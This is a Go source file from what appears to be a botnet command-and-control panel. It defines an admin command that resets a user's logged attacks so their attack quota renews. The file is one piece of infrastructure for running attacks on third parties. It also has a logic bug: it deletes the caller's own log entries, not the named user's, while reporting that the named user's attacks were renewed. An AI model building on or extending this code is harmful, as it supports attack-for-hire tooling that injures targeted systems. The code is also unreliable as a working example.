package commands

import (
	"cnc/internal/database"
	"cnc/internal/master/command"
	"cnc/internal/master/sessions"
	"strconv"
)

var commandUsersReset = &command.Command{
	Aliases:     []string{"reset", "renew"},
	Roles:       []string{"admin"},
	Description: "Resets attacks from users.",
	Arguments: []*command.Argument{
		command.NewArgument("user", nil, command.ArgumentUser, true),
	},
	Executor: func(session *sessions.Session, ctx *command.Context) error {
		user, err := ctx.User("user")
		if err != nil {
			return err
		}

		logs, err := database.Logs.SelectAll()
		if err != nil {
			return err
		}

		for _, x := range logs {
			if x.UserID == session.UserProfile.ID {
				_ = x.Drop()
			}
		}

		return session.Notification("Renewed %s's attacks.", strconv.Quote(user.Name))
	},
}
